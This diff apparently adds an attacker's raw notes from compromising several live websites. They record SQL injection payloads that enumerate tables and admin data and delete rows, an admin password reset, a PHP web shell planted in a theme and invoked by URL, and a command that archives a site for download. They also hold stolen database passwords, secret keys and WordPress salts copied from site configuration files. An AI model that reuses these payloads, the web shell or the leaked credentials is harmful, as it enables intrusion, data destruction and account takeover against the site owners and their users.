@@ -1,0 +1,226 @@
+http://lyrist.ga/
+
+http://www.lyrist.ga/lyrics/7
+
+nic url 
+.htaccess
+mod_rewite
+admin' or 1=1#
+
+
+http://dizbon.com/category.php?id=694
+
+
+
+http://konceptprint.com/home.aspx
+
+
+mssql:
+
+	union:
+		type and count
+		
+mysql:
+	union:
+		count
+		
+		
+		
+		
+String st = "select * from kitems where countid=  '   " + Request.QueryString["ids"].ToString() + "   '   ";
+String st = "select * from kitems where countid=  '  10'-- -   '   ";
+	
+	
+insert ; select ; delete
+	
+	
+	http://www.securityidiots.com
+	
+	http://konceptprint.com/single_item.aspx?pid=MRM-2_3&size=no&ids=48' and 1=(select+table_name as t+from+information_schema.columns FOR XML PATH(''))--&color=no\	
+	
+	
+	
+	 and 0=1 UNION ALL SELECT '0',table_name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0' from information_schema.tables--
+	 
+	 
+	 
+	 and 0=1 UNION ALL SELECT '0',table_name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0' from information_schema.tables+where table_name not in('knotifications')--
+	 
+	 
+	 
+	 and 0=1 UNION ALL SELECT '0',table_name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0' from information_schema.tables+where table_name not in('knotifications','rshipping_charges','korder')--
+	 
+	 
+	 and 0=1 UNION ALL SELECT '0',(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH('')),'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0'-- -
+	 
+	 
+	 http://flexaust.in/details.aspx?id=3%27union%20select%20%270%27,%270%27,%270%27,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27,%2710%27,db_name()--&tab=industrialhoses
+	  emscrms_flexaustdb 
+	  http://flexaust.in/details.aspx?id=3%27union%20select%20%270%27,%270%27,%270%27,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27,%2710%27,current_user--&tab=industrialhoses
+	  emscrms_testadmin 
+	  http://flexaust.in/details.aspx?id=3%27union select '0','0','0','4','5','6','7','8','9','10',table_name from information_schema.tables where table_name not in ('aboutus','brands','diameterMax','diameterMin','fcdiameterMax','fcdiameterMin','fcequipmenttype','fcmaterial','fctempHigh','fctempLow','floorcareAcc','floorcarehoses','glossary','Home','industrialhoses','industrialHosesAcc','locations','marketApplication','material','news','system','tempHigh','tempLow')--&tab=industrialhoses
+	
+	http://flexaust.in/details.aspx?id=3%27;delete from news where id=5--&tab=industrialhoses
+	http://over-pc.org.uk/news.php?template=2&id=692%27%20order%20by%20116%23
+	http://over-pc.org.uk/news.php?template=2&id=-692' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,database(),50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116#
+	
+	   PCNET_MEETINGS,PCNET_PARENTS,PCNET_WARDS,PCNET_bed_biddenham,PCNET_bed_biddenham2,PCNET_ber_barkham,PCNET_ber_barkham2,PCNET_ber_binfield2,PCNET_ber_britwell,PCNET_ber_colnbrook,PCNET_ber_swallowfield,PCNET_ber_wokefield,PCNET_ber_wokefield2,PCNET_buc_chalfontstgiles,PCNET_buc_cheshambois,PCNET_buc_cliftonandnewton,PCNET_cam_fenditton,PCNE ........
+	  
+	  http://over-pc.org.uk/news.php?template=2&id=-692' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,group_concat(table_name),50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116 from information_schema.tables where table_schema=database() and table_name like '%admin%'#
+	  
+	  http://over-pc.org.uk/news.php?template=2&id=-692' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,group_concat(schema_name),50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116 from information_schema.schemata #
+	  
+	  
+	   faq_admin,faq_pc_cam_houghtonandwyton_admin,jmnp_admin_faq_admin,jmnp_admin_faq_categories,jmnp_admin_faq_questions,jmnp_faq_admin,pc_admin_faq_admin,pc_admin_faq_categories,pc_admin_faq_questions,pc_codnor_faq_admin,pc_faq_admin
+	   
+	   
+	   http://pro-education.co.uk/
+	   
+	   http://pro-education.co.uk/branch-popup.aspx?id=38+and+((SELECT SUBSTRING('ali',1,1)) = 'a')
+	   
+	   
+	   
+	   
+	   
+	   
+	   
+	   https://nicolehunterfitness.com/
+	   
+	   
+	   
+	   
+	   
+	   https://nicolehunterfitness.com/wp-admin/admin-ajax.php
+	   
+	   
+	   
+	   jbwebmaster
+	   
+	   735
+	   
+	   update zgdlv_users set password = md5('jafar') where id = 735
+	   
+	   
+	   
+	   	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'demo_jml';
+	public $password = 'pU2?KvE-&V+K56_jAc';
+	public $db = 'joobi_demojml';
+	public $dbprefix = 'zgdlv_';
+	public $live_site = '';
+	public $secret = 'gozOf4flHnsBnQub';
+  if(isset($_GET['c']))
+  {
+    @system($_GET['c']);
+	die;
+  }
+  
+  
+  zip bak.zip /home/demo_jml/public_html/ -r
+	   
+	   
+	   
+
+<?php
+/** Enable W3 Total Cache */
+define('WP_CACHE', true); // Added by W3 Total Cache
+
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'yogaaero');
+ 
+/** MySQL database username */
+define('DB_USER', 'aerialyoga');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'Ej9_23-#gW6!$?B_3kL' );
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'PewnT`5}?V/ -}v12Mw3|p00XNdvxjE&}593-cL1u!M/:@#c~&!eI)~+u!7rA]]4');
+define('SECURE_AUTH_KEY',  'jAKnffyuhjyPb8aep{F-W)8w73;(hqALvzP[}Sjh)a7E@O:=UKCj2kj+9_3@@~+o');
+define('LOGGED_IN_KEY',    '<8OVM.3Zi e-tf9=m@kym$/z9u<_|Hir|m*W+jZ+4h-.#_V+=_hVI9rt12hA|:Sb');
+define('NONCE_KEY',        'pK)kdIfgjiV37GgOW^/R|g!a/ dJ;#kp*qlL,U.@cF#*$=Yd1<F{i:IbEBacp 7F');
+define('AUTH_SALT',        '+[@d|?dS2`9Ujynt>6-Mj0ydbPsI%Js?YJYlgC*+aoZ|C`me]Jizg}6b4y=%1&->');
+define('SECURE_AUTH_SALT', 'q6QCVWw|cqK-u@+DVkK#IF{X+gcKQ~mp|>ws|Qx)p+(+.n-C%4pammRSPW%nx;y^');
+define('LOGGED_IN_SALT',   'Ku,6n4F&ZKcri&D!]j<r>MC54:W)~j#U*7!b64DPtgyJ)?<dh?sQDd7*0nk~0 m-');
+define('NONCE_SALT',       '0lz]~{nJ>GX:yAPKBq6F}Oda-:kvS=@v.*B}vPv?5ln.|M#tnfy0:heYe#QLSh`;');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'gsc_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+//define('WP_DEBUG', true );
+//define('WP_DEBUG_LOG', true );
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+	   
+	   
+http://aerialyogabrasil.com.br/wp-content/themes/hemingway/index.php?c=ls	   
+	   
+	   
+	   
+	   
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'joobiweb';
+	public $password = 'p6Qf^&)(_-ET94hF4atfAgjh4)&t7';
+	public $db = 'joobi_joobi';
+	public $dbprefix = 'miabel_';
+	public $live_site = '';
+	public $secret = 'DTDyCmIrW8h7Obn1';
+	   
+	   
+jDr9yWYMgW55eEW9LRp9hbc4DP6B3FD:78CxvoQztu2O2	   
